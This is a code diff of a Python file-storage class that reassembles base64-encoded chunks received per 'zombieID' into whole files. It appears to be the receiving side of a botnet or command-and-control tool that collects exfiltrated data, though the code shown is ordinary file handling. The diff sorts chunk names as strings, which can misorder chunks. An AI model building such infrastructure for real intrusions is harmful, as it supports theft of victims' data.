@@ -1,9 +1,9 @@
-from os import makedirs, path, remove, rename
 import secrets
 from base64 import b64decode
 import logging
 from datetime import datetime
 from pathlib import Path
+from os import remove
 
 """
 - Define way to interact with files on disk
@@ -38,6 +38,11 @@ class ioFiles:
         self._build_dirs(zombieID)
         self.files = []
         return
+
+    def get_pre_files_count(self):
+        pre = self.home / "pre"
+        files = [x for x in pre.iterdir()]
+        return len(files)
 
     def _build_dirs(self,zombieID:str):
         """
@@ -76,12 +81,13 @@ class ioFiles:
         try:
             # path = f"./files/pre/{zombieID}"
             pre = self.home / "pre"
-            token = secrets.token_urlsafe(6)
+            token = str(self.get_pre_files_count() + 1)
             path = pre / token
             logger.debug(f"NOW OPENING: {path}")
             try:
                 with open(path,'a') as f:
                     res = f.write(data)
+                    #res = f.write(data.decode('utf-8'))
                     logger.debug(f"saved {res} bytes")
                     self.files.append(path)
                     f.close()
@@ -90,66 +96,110 @@ class ioFiles:
                 logger.debug("Trying alt")
                 with open(path,"w") as f:
                     res = f.write(data)
+                    #res = f.write(data.decode('utf-8'))
                     logger.debug(f"Saved {res} bytes")
                     self.files.append(path)
                     f.close()
                     return True  
         except Exception as e:
-            logger.error(f"E1: UNABLE TO WRITE CHUNK: {data} for reason: {e}")
+            logger.error(f"E1: UNABLE TO WRITE CHUNK: {data[0:10]} for reason: {e}")
             return False
         # else:
         #     print(f"WRITE_CHUNK => E2: UNABLE TO WRITE CHUNK: {data}")
         #     return False
     
     """
-    - take the file that was just finished being recived, move it to post directory, and finally remove the original pre file.
-        - should be able to do something with split and 'CHUNK:'
+    - Process all chunk files in <zombieID>/pre and rebuild them as one final file in <zombieID>/post
     """
-    def process_file(self,zombieID:str):
-        pre = self.files.pop()
+    def process_file(self, zombieID:str):
         post = self.home / "post"
-        token = secrets.token_urlsafe(6)
-        postfile = post / token
-        with open(pre,"r") as f:
-            pre_file = f.read()
-            f.close()
-        #prefile should now contain all chunks recieved from client
-            # - need to split and decode each chunk before writting
-        #print(f"PROCESS_FILE => preprocessed data found: {pre_file}")
-        chunks = pre_file.split("CHUNK:")[0:]
-        logger.debug(f"FOUND CHUNKS: {len(chunks)}")
-        data = "" 
-        logger.debug(f"DECODED DATA, WRITTING")
-        try:
-            for chunk in chunks:
-                logger.debug(f"PROCESS_FILE => in for loop, chunk len: {len(chunk)}")
-                enc = b64decode(chunk)
-                data += enc.decode('utf-8')
-            with open(postfile,"a") as f:
-                f.write(data)
+        pre = self.home / "pre"
+        prefiles = [x for x in pre.iterdir()]
+        prefiles.sort()
+        token = secrets.token_hex(15)
+        postfile_path = post / token
+        file_num = self.get_pre_files_count()
+        chunks = []
+        # first read all chunk files into memory
+
+        for file in prefiles:
+            with open(file,'r') as f:
+                chunks.append(f.read())
                 f.close()
-        except Exception as e:
-            logger.error(f"ERROR, COUDLN'T DECODE: {e}")
-            logger.debug(f"SAVING RAW CHUNKS.....")
-            with open(postfile,"w") as f:
-                f.write(pre_file)
-                f.close()     
-        #print(f"PROCESS_FILE => now saving pre_file data to {postfile}")
-        try:
+        logger.debug(f"now read {file_num} chunks into memory")
+
+        # clean chunks
+        clean = ""
+        for chunk in chunks:
+            clean = clean + chunk.split(":")[1]
+        logger.debug(f"Cleaned chunk, combined size: {len(clean)}")
+
+        # decode data and save to post
+        data_enc = b64decode(clean)
+        logger.debug(f"data_enc is of type {type(data_enc)}")
+        logger.debug(f"first bytes: {data_enc[0:8]}")
+        #data_raw = data_enc.decode('utf-8')
+        logger.debug(f"raw data processed, now saving to {postfile_path}")
+        with open(postfile_path, 'wb') as f:
+            num = f.write(data_enc)
+            f.close()
+        logger.debug(f"file saved! Wrote: {num}")
+
+        # clean up pre files
+        logger.debug(f"now removing pre files: {prefiles}")
+        for prefile in prefiles:
             try:
-                logger.debug(f"now removing {pre_file}")
-                remove(pre)
-                return token
-            except:
-                logger.error(f"COULDN'T REMOVE {pre}")
-                #logger.debug("BACKING UP AND DELETING")
-                #files = './files'
-                #Rename files directory and move out of way to be recreated by server
-                #rename(files,f"./files-{token}")
-                #remove(self.pre)
-                return None
-        except Exception as e:
-            logger.error(f"UNABLE TO FAIL SAFELY: {e}")
-            return None
+                remove(prefile)
+            except Exception as e:
+                logger.error(f"couldn't remove prefile {prefile} due to: {e}")
+        return token
+
+
+        # Now parse chunks
+        # pre = self.files.pop()
+        # post = self.home / "post"
+        # token = secrets.token_hex(6)
+        # postfile = post / token
+        # with open(pre,"r") as f:
+        #     pre_file = f.read()
+        #     f.close()
+        # #prefile should now contain all chunks recieved from client
+        #     # - need to split and decode each chunk before writting
+        # #print(f"PROCESS_FILE => preprocessed data found: {pre_file}")
+        # chunks = pre_file.split("CHUNK:")[0:]
+        # logger.debug(f"FOUND CHUNKS: {len(chunks)}")
+        # data = "" 
+        # logger.debug(f"DECODED DATA, WRITTING")
+        # try:
+        #     for chunk in chunks:
+        #         logger.debug(f"in for loop, chunk len: {len(chunk)}")
+        #         enc = b64decode(chunk)
+        #         data += enc.decode('utf-8')
+        #     with open(postfile,"a") as f:
+        #         f.write(data)
+        #         f.close()
+        # except Exception as e:
+        #     logger.error(f"ERROR, COUDLN'T DECODE: {e}")
+        #     logger.debug(f"SAVING RAW CHUNKS.....")
+        #     with open(postfile,"w") as f:
+        #         f.write(pre_file)
+        #         f.close()     
+        # #print(f"PROCESS_FILE => now saving pre_file data to {postfile}")
+        # try:
+        #     try:
+        #         logger.debug(f"now removing {pre}")
+        #         remove(pre)
+        #         return token
+        #     except:
+        #         logger.error(f"Couldn't delete file: {pre}")
+        #         #logger.debug("BACKING UP AND DELETING")
+        #         #files = './files'
+        #         #Rename files directory and move out of way to be recreated by server
+        #         #rename(files,f"./files-{token}")
+        #         #remove(self.pre)
+        #         return None
+        # except Exception as e:
+        #     logger.error(f"UNABLE TO FAIL SAFELY: {e}")
+        #     return None
         
     
